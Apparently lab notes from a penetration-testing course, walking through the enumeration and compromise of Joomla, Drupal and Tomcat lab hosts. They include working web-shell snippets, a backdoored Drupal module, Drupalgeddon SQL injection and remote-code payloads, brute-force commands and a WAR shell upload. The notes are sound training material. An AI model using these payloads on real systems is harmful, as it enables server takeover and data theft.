         LICENSE file found      > http://dev.inlanefreight.local/components/com_mailto/mailto.xml
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_media/media.xml
         Explorable Directory    > http://dev.inlanefreight.local/components/com_mailto/
         Explorable Directory    > http://dev.inlanefreight.local/components/com_media/
Component found: com_newsfeeds   > http://dev.inlanefreight.local/index.php?option=com_newsfeeds
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_media/
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_newsfeeds/newsfeeds.xml
         Explorable Directory    > http://dev.inlanefreight.local/components/com_newsfeeds/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_newsfeeds/
Component found: com_search      > http://dev.inlanefreight.local/index.php?option=com_search
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_search/search.xml
         Explorable Directory    > http://dev.inlanefreight.local/components/com_search/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_search/
Component found: com_users       > http://dev.inlanefreight.local/index.php?option=com_users
         LICENSE file found      > http://dev.inlanefreight.local/administrator/components/com_users/users.xml
Component found: com_wrapper     > http://dev.inlanefreight.local/index.php?option=com_wrapper
         Explorable Directory    > http://dev.inlanefreight.local/components/com_users/
         Explorable Directory    > http://dev.inlanefreight.local/administrator/components/com_users/
         LICENSE file found      > http://dev.inlanefreight.local/components/com_wrapper/wrapper.xml
         Explorable Directory    > http://dev.inlanefreight.local/components/com_wrapper/
End Scanner
```

At this point, we know that we are dealing with Joomla `3.9.4`. The administrator login portal is located at `http://dev.inlanefreight.local/administrator/index.php`. Attempts at user enumeration return a generic error message.

![Screenshot_2026-04-05_12_35_35.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/b8d36f8f-e1a9-40c4-aeb8-4fc774e859c0.png)

The default administrator account on Joomla installs is `admin`, but the password is set at install time. We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

```bash
$ sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w  /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

 admin:turnkey

```

## **Attacking Joomla**

**Abusing Built-In Functionality**

Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.

![Screenshot_2026-04-05_12_49_37.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/47613bde-2d15-4e01-8c41-8a09a0a98c93.png)

From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.

![Screenshot_2026-04-05_12_51_37.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/47e31e3b-89cb-4d6e-9294-95d4feac6531.png)

Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

![Screenshot_2026-04-05_12_54_44.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/199b149a-42dc-449b-a962-ee410c19fa10.png)

Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.

Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.

```bash
$ curl http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. We should be sure, once again, to note down this change for our report appendices and make every effort to remove the PHP snippet from the `error.php` page.

### Leveraging Known Vulnerabilities

At the time of writing, there have been [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) Joomla-related vulnerabilities that received CVEs. 

We find that this version of Joomla is likely vulnerable to [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) which is a directory traversal and authenticated file deletion vulnerability. The python3 version of the exploit is [here](https://github.com/dpgg101/CVE-2019-10945/tree/main). We can use the exploit to leverage the vulnerability and list the contents of the webroot and other directories. We can also use it to delete files (not recommended). This could lead to access to sensitive files such as a configuration file or script holding credentials if we can then access it via the application URL. An attacker could also cause damage by deleting necessary files if the webserver user has the proper permissions.

We can run the script by specifying the `--url`, `--username`, `--password`, and `--dir` flags. As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above.

```bash
$ python3 CVE-2019-10945.py --url http://dev.inlanefreight.local/administrator/ --username admin --password admin --dir / --proxy http://127.0.0.1:8080
/home/kali/Documents/HTB/Attacking-common-app/CVE-2019-10945/CVE-2019-10945.py:52: SyntaxWarning: invalid escape sequence '\ '
  | |  | |   /\   |  _ \ / __ \ / __ \|  _ \
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       

administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
flag_6470e394cbf6dab6a91682cc8585059b.txt
htaccess.txt
index.php
robots.txt
web.config.txt
```

Normally, a media manager is restricted to a specific directory (e.g., `/images`). Path traversal occurs when the application fails to sanitize input like `../`, allowing a user to navigate outside that "sandbox. 

- The request uses `folder=/..`. In many file systems, `..` represents the parent directory.
- If the application is vulnerable, it appends `/..` to its internal base path. If the base path was `/var/www/html/images`, the resulting path becomes `/var/www/html/images/..`, which resolves to the web root (`/var/www/html/`
- The application then processes this resolved path and returns a list of files in the web root.

```bash
GET /administrator//?option=com_media&view=mediaList&tmpl=component&folder=/.. HTTP/1.1
Host: dev.inlanefreight.local
```

![Screenshot_2026-04-05_14_52_26.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d1669693-e2c0-4506-98f4-cbfe19ccd4fa.png)

```bash
$ curl http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt -H "Cookie: b3832796fcc06a2991b186374e8f3acf=ls0kg6cdj4sdm406lmcmj5mc33"
j00mla_c0re_d1rtrav3rsal!
```

## **Drupal - Discovery & Enumeration**

[Drupal](https://www.drupal.org/), launched in 2001 is the third and final CMS we'll cover on our tour through the world of common applications. Drupal is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend.

### Discovery/Footprining

A Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt file`, via the page source, or clues in the robots.txt file such as references to `/node`.

```bash
$ curl -s http://drupal.inlanefreight.local | grep Drupal
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Another way to identify Drupal CMS is through [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes). Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the 
form `/node/<nodeid>`.

```bash
http://drupal.inlanefreight.local/node/1
http://drupal.inlanefreight.local/node/2 
```

For example, the blog post above is found to be at `/node/1`. This representation is helpful in identifying a Drupal website when a custom theme is in use.

- Note: Not every Drupal installation will look the same or display the login page or even allow 
users to access the login page from the internet.

Drupal supports three types of users by default:

1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

### Enumeration

Once we have discovered a Drupal instance, we can do a combination of manual and tool-based (automated) enumeration to uncover the version, installed plugins, and more. Depending on the Drupal version and any hardening measures that have been put in place, we may need to try several ways to identify the version number. Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files, so we may need to do further enumeration. Let's look at an example of enumerating the version number using the `CHANGELOG.txt` file. To do so, we can use `cURL` along with `grep`, `sed`, `head`, etc.

```bash
$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```

Here we have identified an older version of Drupal in use. Trying this against the latest Drupal version at the time of writing, we get a 404 response.

we can also use `droopescan`

```bash
$ droopescan scan drupal -u http://drupal.inlanefreight.local 
[+] Plugins found:                                                              
    captcha http://drupal.inlanefreight.local/modules/captcha/
        http://drupal.inlanefreight.local/modules/captcha/README.md
        http://drupal.inlanefreight.local/modules/captcha/LICENSE.txt
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login
```

Drupal **8.9.0**was released on **June 3, 2020**. search for vulnerable [here](https://security.snyk.io/package/composer/drupal%2Fdrupal) and [here](https://www.cvedetails.com/version-list/1367/2387/6/Drupal-Drupal.html?sha=6ea74d95e430e51daf28e2e26b29e52830d18650&order=1&trc=753#:~:text=8%2E9%2E1) 

## Attacking Dropal

Now that we've confirmed that we are facing Drupal and fingerprinted the version let's look and see what misconfigurations and vulnerabilities we can uncover to attempt to gain internal network access.

Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.

### **Leveraging the PHP Filter Module**

In older version of Drupal (before 8)it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."

- In Vhost `drupal-qa.inlanefreight.local`  the version is 7.30
    
    

![Screenshot_2026-04-06_14_44_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/18bd0bb4-c845-40f6-88e0-b964f0da7312.png)

![Drupal modules page with PHP filter module highlighted, allowing embedded PHP code to be evaluated.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/drupal_php_module.png)

From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.

```
http://drupal-qa.inlanefreight.local/#overlay=node/add
```

![Drupal add content page with Basic page option highlighted for static content like 'About us' pages.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/basic_page.png)

We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during our assessment. 

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

![Drupal create basic page interface with PHP code input, highlighting text format set to PHP code.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/basic_page_shell_7v2.png)

We also want to make sure to set `Text format` drop-down to `PHP code`. After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`

```
http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

![Screenshot_2026-04-06_15_06_22.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/d0502f1b-108e-45b1-b81d-755ee4dc2198.png)

On Vhost `drupal.inlanefreight.local/` the version installed is 8.9.0 ~ 8.9.1 and from version 8 onward, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves ( we need to check with clients before adding or changing something). Start by downloading the most recent version of the module from the Drupal website.

```bash
$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.zip
```

Once downloaded go to `Administration` > `Reports` > `Available updates`.

Note: Location may differ based on the Drupal version and may be under the Extend menu.

```bash
http://drupal.inlanefreight.local/admin/reports/updates/install
```

![Drupal install page with options to install modules or themes from a URL or upload an archive file.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/install_module.png)

From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.If it says it was installed already, check in the Extend tab and check the PHP Filter

![Screenshot_2026-04-06_16_13_27.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/8e32a44b-45a7-4cae-80a0-8ed137cf434d.png)

Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.

### Uploading a Backdoored Module

Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).Download the archive and extract its contents.

```bash
$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
$ tar xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary
 as Drupal denies direct access to the /modules folder.

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.

```bash
$ mv shell.php .htaccess captcha
$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install
captcha/shell.php
captcha/.htaccess

<SNIP>
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.

```bash
$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Leveraging Known Vulnerabilities

Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that
could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability,
which affects versions of Drupal prior to 7.58 and 8.5.1. The
vulnerability occurs due to insufficient input sanitization during user
registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability
that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

Let's walk through exploiting each of these.

### **Drupalgeddon**

As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution

```bash
$ proxychains4 python2.7 34992  -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
                                                                        
```

![Screenshot_2026-04-07_14_00_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/cdeeaf6a-ecf8-401c-9e39-07be30741f7c.png)

This is the POST form 

```bash
name=test&pass=test&form_build_id=form-jQzvI-_GdTMcEzZfoRp0lIvFSO0pONd3cKaQzcLY8b0&form_id=user_login_block&op=Log+in
```

and this is the SQLi code:

```sql
name[0 ;insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'hacker', '$S$CTo9G7Lx2sphduBDMh.2VvPve4REgk6LzTgMlJVvpMf8ovqvBjSs' FROM users;insert into users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name = 'hacker'), 3);;#  ]=test3&name[0]=test&pass=shit
```

After logging, you will see that the current user now has administrative role

![Screenshot_2026-04-06_17_20_03.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/52af78fb-ab57-4c9f-91d0-5983f1bebb1c.png)

We could also use the [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module to exploit this.

### Drupalgeddon2

We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.

![Screenshot_2026-04-07_14_08_40.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-04-07_14_08_40.png)

```bash
form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo ";-)" | tee hello.txt
```

```bash
$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

This is a [technical deta](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/)ils about the target. Now lets change the script and add a web shell

```bash
$ echo'<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

![Screenshot_2026-04-07_14_32_57.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/5383d858-fbd2-4832-be82-93710f11ece6.png)

```bash
form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee shell.php
```

Execute the shell:

```bash
$ curl -s http://drupal-dev.inlanefreight.local/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. I used this [exploit](https://github.com/h3x0v3rl0rd/drupalgeddon3/blob/main/drupalgeddon3.py)

The exploit do as follow:

1. After login as admin, visit an exiting node to delete

![Screenshot_2026-04-07_15_25_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/7a52406c-8739-47c8-a78e-ef4ac90ebc81.png)

1. Then it search in the source code for `form_token` and `form_build_id`

```html
<input type="hidden" name="form_build_id" value="form-10xd44VXh30UCoo8IQCXeccITRGJ9O2B2YESO5OTWBQ" />
<input type="hidden" name="form_token" value="dKyWD0T-Zes4IrdTuQ0dTOKbJ2q2MBK5f1e4aHHPKZs" />
```

with the form_token it sends the first POST request

```html
http://drupal-qa.inlanefreight.local/?q=node/1/delete&destination=node?q[%23][]=passthru%26q[%23type]=markup%26q[%23markup]=id

form_id=node_delete_confirm&_triggering_element_name=form_id&form_token=YOUR_TOKEN_HERE
```

![Screenshot_2026-04-07_15_58_24.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/0e8225d5-90a5-4940-93ee-9386c1783b71.png)

The second POST, it takes the form_build_id from the first POST response and send this POST

```html
URL: http://drupal-qa.inlanefreight.local/?q=file/ajax/actions/cancel/%23options/path/NEW_FORM_BUILD_ID

body: form_build_id=NEW_FORM_BUILD_ID
```

and the response is remote command execution

```bash
$ python3 drupal3.py http://drupal-acc.inlanefreight.local/ "SESS45ecfcb93a827c3e578eae161f280548=3VWgHtD0oHXgzZLlBotee0lsq9lHVZ94WALTAM_7tvc" 5 "id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Servlet Containers/ Software Development

## **Tomcat - Discovery & Enumeration**

During our external penetration test, we run EyeWitness and see one host listed under "High Value Targets."

```bash
$ nmap app-dev.inlanefreight.local -p 80,443,8000,8080,8180,8888,10000 --open -oA tomcat_nmapResult  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-07 22:45 +03
Nmap scan report for app-dev.inlanefreight.local (10.129.56.228)
Host is up (0.18s latency).
Not shown: 2 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
8000/tcp open  http-alt
8080/tcp open  http-proxy
8180/tcp open  unknown
8888/tcp open  sun-answerbook

```

```bash
$ eyewitness --web -x tomcat_nmapResult.xml  -d Tomcat_ScanResult
################################################################################
#                                  EyeWitness                                  #
################################################################################
#           Red Siege Information Security - https://www.redsiege.com           #
################################################################################

Starting Web Requests (3 Hosts)
Attempting to screenshot http://app-dev.inlanefreight.local
Attempting to screenshot http://app-dev.inlanefreight.local:8000
Attempting to screenshot http://app-dev.inlanefreight.local:8080
Finished in 9.857967376708984 seconds

[*] Done! Report written in the /home/kali/Tomcat_ScanResult folder!
Would you like to open the report now? [Y/n]
y
```

![Screenshot_2026-04-07_22_48_30.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/2be6b51a-ca42-4712-a857-b5adf8ec78a1.png)

Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. Here we can see that Tomcat version `9.0.30` is in use.

![Screenshot_2026-04-07_22_57_00.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/c7382ac5-f832-4478-ac72-08bf2c93ddbd.png)

Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the `docs` page

![Screenshot_2026-04-07_23_01_43.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/4bb814ca-eb51-4957-9bd5-313b7e9db079.png)

This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.

```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

- The `bin` folder stores scripts and binaries needed to start and run a Tomcat server.
- The `conf` folder stores various configuration files used by Tomcat.
- The `tomcat-users.xml` file stores user credentials and their assigned roles.
- The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat.
- The `logs` and `temp` folders store temporary log files.
- The `webapps` folder is the default webroot of Tomcat and hosts all the applications.
- The `work` folder acts as a cache and is used to store data during runtime.

Each folder inside `webapps` is expected to have the following structure.

```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
```

The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes 
handling these routes. All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The `lib` folder stores the libraries needed by that particular application. The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`, which can be compared to PHP files on an Apache server.

Here’s an example web.xml file.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>
```

The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.inlanefreight.api.AdminServlet`. Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:

- `classes/com/inlanefreight/api/AdminServlet.class`

Next, a new servlet mapping is created to map requests to `/admin` with `AdminServlet`. This configuration will send any request received for `/admin` to the `AdminServlet.class` class for processing. The `web.xml` descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />

</tomcat-users>
```

 In this example, we can see that a user `tomcat` with the password `tomcat` has the `manager-gui` role, and a second weak password `admin` is set for the user account `admin`

### Enumeration

After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages. We can attempt to locate these with a tool such as `Gobuster` or just browse directly to them.

```bash
$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://web01.inlanefreight.local:8180/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

Try to login to these endpoints with the credentials found in tomcat-users.xml file, if not we will try brute force. If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

## Attacking Tomcat

We've identified that there is indeed a Tomcat host exposed externally by our client. As the scope of the assessment is relatively small and all of the other targets are not particularly interesting, let's turn our full attention to attempting to gain internal access via Tomcat.

As discussed in the previous section, if we can access the `/manager` or `/host-manager` endpoints,  Let's start by brute-forcing the Tomcat manager page on the Tomcat instance at `http://web01.inlanefreight.local:8180`

### Tomcat Manager- Brute Force

This is the login method, it uses basic authentication

```bash
GET /manager/html HTTP/1.1
Host: web01.inlanefreight.local:8180

Authorization: Basic dGVzdDp0ZXN0
```

Metasploit has a module that brute-forces basic authentication 

```bash
msf6 > use auxiliary/scanner/http/http_login
msf6 auxiliary(scanner/http/http_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/http_login) > set RHOSTS 10.129.201.58
msf6 auxiliary(scanner/http/http_login) > set RpoRT 8180
msf6 auxiliary(scanner/http/http_login) > set stop_on_success true
msf6 auxiliary(scanner/http/http_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt 
msf6 auxiliary(scanner/http/http_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

```

Run the scanner and get a hit for the credential pair `tomcat:root`.

```bash
[+] 10.129.201.58:8180 - Success: 'tomcat:root'
```

We can also use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result.

### Tomcat Manager - WAR File Upload

Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.

![Tomcat Web Application Manager interface showing applications list with paths, status, and deployment options.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/tomcat_mgr.png)

The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.

```bash
$ zip -r backup.war cmd.jsp 
```

Click on `Browse` to select the .war file and then click on `Deploy`.

![Tomcat Web Application Manager showing applications list with paths, status, and commands, including '/backup' running with zero sessions.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/war_deployed.png)

